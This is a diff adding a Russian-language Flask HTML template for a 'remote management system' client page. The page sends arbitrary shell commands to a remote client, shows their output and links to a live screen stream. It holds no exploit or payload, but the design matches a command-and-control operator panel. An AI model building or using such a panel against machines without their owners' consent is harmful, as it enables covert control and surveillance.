@@ -1,0 +1,311 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Управление клиентом: {{ client_id }}</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='css/styles.css') }}">
+    <style>
+        .command-section {
+            margin: 20px 0;
+            padding: 20px;
+            background-color: #f9f9f9;
+            border-radius: 5px;
+        }
+        
+        .command-history {
+            margin-top: 30px;
+        }
+        
+        .status-pending {
+            color: #f39c12;
+            font-weight: bold;
+        }
+        
+        .status-completed {
+            color: #27ae60;
+        }
+        
+        .command-input {
+            width: 80%;
+            padding: 10px;
+            font-family: monospace;
+        }
+        
+        .client-info {
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-start;
+            margin-bottom: 20px;
+        }
+        
+        .info-box {
+            flex: 1;
+            padding: 15px;
+            margin-right: 15px;
+            background-color: #f5f5f5;
+            border-radius: 5px;
+            border-left: 5px solid #3498db;
+        }
+        
+        .stream-button {
+            display: inline-block;
+            padding: 10px 15px;
+            background-color: #2196F3;
+            color: white;
+            text-decoration: none;
+            border-radius: 4px;
+            margin-top: 10px;
+        }
+        
+        .stream-button:hover {
+            background-color: #0b7dda;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1>Управление клиентом</h1>
+            <nav>
+                <a href="{{ url_for('dashboard') }}">Назад к панели управления</a>
+            </nav>
+        </header>
+        
+        <main>
+            <div class="client-info">
+                <div class="info-box">
+                    <h2>Информация о клиенте</h2>
+                    <p><strong>ID:</strong> {{ client_id }}</p>
+                    <p><strong>Последняя активность:</strong> {{ client_data.last_seen.strftime('%H:%M:%S %d.%m.%Y') }}</p>
+                    
+                    {% if client_data.stream_info %}
+                    <p><strong>Тип стрима:</strong> {{ client_data.stream_info.type }}</p>
+                    <p><strong>URL стрима:</strong> {{ client_data.stream_info.url }}</p>
+                    {% if client_data.stream_info.proxy_url %}
+                    <a href="{{ client_data.stream_info.proxy_url }}" class="stream-button">Смотреть экран</a>
+                    {% endif %}
+                    {% else %}
+                    <p><em>Стрим недоступен</em></p>
+                    {% endif %}
+                </div>
+            </div>
+            
+            <div class="command-section">
+                <h2>Отправить команду</h2>
+                <form id="command-form">
+                    <input type="text" id="command-input" class="command-input" placeholder="Введите команду для выполнения (например, dir, ipconfig и т.д.)">
+                    <button type="submit">Отправить</button>
+                </form>
+                <div id="command-status" style="margin-top: 10px;"></div>
+            </div>
+            
+            <div class="command-history">
+                <h2>История команд</h2>
+                <table>
+                    <thead>
+                        <tr>
+                            <th>Команда</th>
+                            <th>Статус</th>
+                            <th>Время создания</th>
+                            <th>Время выполнения</th>
+                            <th>Результат</th>
+                        </tr>
+                    </thead>
+                    <tbody id="command-list">
+                        {% for cmd in client_data.commands|reverse %}
+                        <tr>
+                            <td>{{ cmd.command }}</td>
+                            <td class="status-{{ cmd.status }}">{{ cmd.status }}</td>
+                            <td>{{ cmd.timestamp }}</td>
+                            <td>{{ cmd.completed_at|default('Ожидание...') }}</td>
+                            <td>
+                                {% if cmd.status == 'completed' and cmd.stdout is defined %}
+                                <button type="button" onclick="showCommandOutput('{{ cmd.id }}')">Показать вывод</button>
+                                {% endif %}
+                            </td>
+                        </tr>
+                        {% endfor %}
+                    </tbody>
+                </table>
+                {% if not client_data.commands %}
+                <p id="no-commands">Команды еще не отправлялись.</p>
+                {% endif %}
+            </div>
+        </main>
+        
+        <footer>
+            <p>Система удаленного управления - Проект Flask</p>
+        </footer>
+    </div>
+    
+    <!-- Модальное окно для вывода команды -->
+    <div id="output-modal" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(0,0,0,0.5); z-index: 1000;">
+        <div style="background-color: white; margin: 10% auto; padding: 20px; width: 80%; max-height: 70%; overflow: auto; border-radius: 5px;">
+            <span id="close-modal" style="float: right; cursor: pointer; font-size: 20px; font-weight: bold;">&times;</span>
+            <h3 id="modal-command-title">Результат выполнения команды</h3>
+            <div style="margin-top: 20px;">
+                <h4>Стандартный вывод:</h4>
+                <pre id="command-stdout" style="background-color: #f5f5f5; padding: 10px; overflow: auto; max-height: 300px; white-space: pre-wrap;"></pre>
+                
+                <div id="stderr-section" style="margin-top: 10px;">
+                    <h4>Стандартный вывод ошибок:</h4>
+                    <pre id="command-stderr" style="background-color: #fff0f0; padding: 10px; overflow: auto; max-height: 150px; white-space: pre-wrap;"></pre>
+                </div>
+                
+                <div style="margin-top: 10px;">
+                    <p>Код завершения: <span id="exit-code"></span></p>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const commandForm = document.getElementById('command-form');
+            const commandInput = document.getElementById('command-input');
+            const commandStatus = document.getElementById('command-status');
+            const commandList = document.getElementById('command-list');
+            const noCommandsMessage = document.getElementById('no-commands');
+            const outputModal = document.getElementById('output-modal');
+            const closeModalBtn = document.getElementById('close-modal');
+            
+            // Закрытие модального окна при клике на крестик
+            closeModalBtn.addEventListener('click', function() {
+                outputModal.style.display = 'none';
+            });
+            
+            // Закрытие модального окна при клике вне его
+            window.addEventListener('click', function(event) {
+                if (event.target === outputModal) {
+                    outputModal.style.display = 'none';
+                }
+            });
+            
+            // Функция для отправки команды
+            commandForm.addEventListener('submit', function(e) {
+                e.preventDefault();
+                const command = commandInput.value.trim();
+                if (!command) return;
+                
+                // Отображаем статус отправки
+                commandStatus.textContent = 'Отправка команды...';
+                commandStatus.style.color = '#3498db';
+                
+                // Отправляем команду
+                fetch('/send-command/{{ client_id }}', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/x-www-form-urlencoded',
+                    },
+                    body: `command=${encodeURIComponent(command)}`
+                })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.success) {
+                        commandStatus.textContent = 'Команда успешно отправлена!';
+                        commandStatus.style.color = '#2ecc71';
+                        commandInput.value = '';
+                        
+                        // Обновляем список команд
+                        updateCommandList();
+                        
+                        // Скрываем сообщение об отсутствии команд, если оно отображается
+                        if (noCommandsMessage) {
+                            noCommandsMessage.style.display = 'none';
+                        }
+                    } else {
+                        commandStatus.textContent = `Ошибка: ${data.error}`;
+                        commandStatus.style.color = '#e74c3c';
+                    }
+                })
+                .catch(error => {
+                    commandStatus.textContent = `Ошибка сети: ${error.message}`;
+                    commandStatus.style.color = '#e74c3c';
+                });
+            });
+            
+            // Функция для обновления списка команд
+            function updateCommandList() {
+                fetch('/api/command-status/{{ client_id }}')
+                .then(response => response.json())
+                .then(data => {
+                    if (data.commands && data.commands.length > 0) {
+                        // Очищаем текущий список
+                        commandList.innerHTML = '';
+                        
+                        // Добавляем команды в обратном порядке (новые сверху)
+                        data.commands.slice().reverse().forEach(cmd => {
+                            const row = document.createElement('tr');
+                            
+                            const commandCell = document.createElement('td');
+                            commandCell.textContent = cmd.command;
+                            
+                            const statusCell = document.createElement('td');
+                            statusCell.textContent = cmd.status;
+                            statusCell.className = `status-${cmd.status}`;
+                            
+                            const timestampCell = document.createElement('td');
+                            timestampCell.textContent = cmd.timestamp;
+                            
+                            const completedCell = document.createElement('td');
+                            completedCell.textContent = cmd.completed_at || 'Ожидание...';
+                            
+                            const outputCell = document.createElement('td');
+                            if (cmd.status === 'completed' && cmd.stdout !== undefined) {
+                                const outputBtn = document.createElement('button');
+                                outputBtn.type = 'button';
+                                outputBtn.textContent = 'Показать вывод';
+                                outputBtn.addEventListener('click', function() {
+                                    showCommandOutputFromData(cmd);
+                                });
+                                outputCell.appendChild(outputBtn);
+                            }
+                            
+                            row.appendChild(commandCell);
+                            row.appendChild(statusCell);
+                            row.appendChild(timestampCell);
+                            row.appendChild(completedCell);
+                            row.appendChild(outputCell);
+                            
+                            commandList.appendChild(row);
+                        });
+                    }
+                })
+                .catch(error => console.error('Ошибка при обновлении списка команд:', error));
+            }
+            
+            // Функция для отображения вывода команды
+            window.showCommandOutput = function(commandId) {
+                fetch(`/api/command-details/{{ client_id }}/${commandId}`)
+                .then(response => response.json())
+                .then(data => {
+                    if (data.command) {
+                        showCommandOutputFromData(data.command);
+                    }
+                })
+                .catch(error => console.error('Ошибка при получении деталей команды:', error));
+            };
+            
+            function showCommandOutputFromData(cmd) {
+                document.getElementById('modal-command-title').textContent = `Результат выполнения команды: ${cmd.command}`;
+                document.getElementById('command-stdout').textContent = cmd.stdout || 'Нет стандартного вывода';
+                
+                const stderrSection = document.getElementById('stderr-section');
+                if (cmd.stderr && cmd.stderr.trim() !== '') {
+                    document.getElementById('command-stderr').textContent = cmd.stderr;
+                    stderrSection.style.display = 'block';
+                } else {
+                    stderrSection.style.display = 'none';
+                }
+                
+                document.getElementById('exit-code').textContent = cmd.exit_code !== undefined ? cmd.exit_code : 'Н/Д';
+                outputModal.style.display = 'block';
+            }
+            
+            // Обновляем список команд каждые 5 секунд
+            setInterval(updateCommandList, 5000);
+        });
+    </script>
+</body>
+</html> 
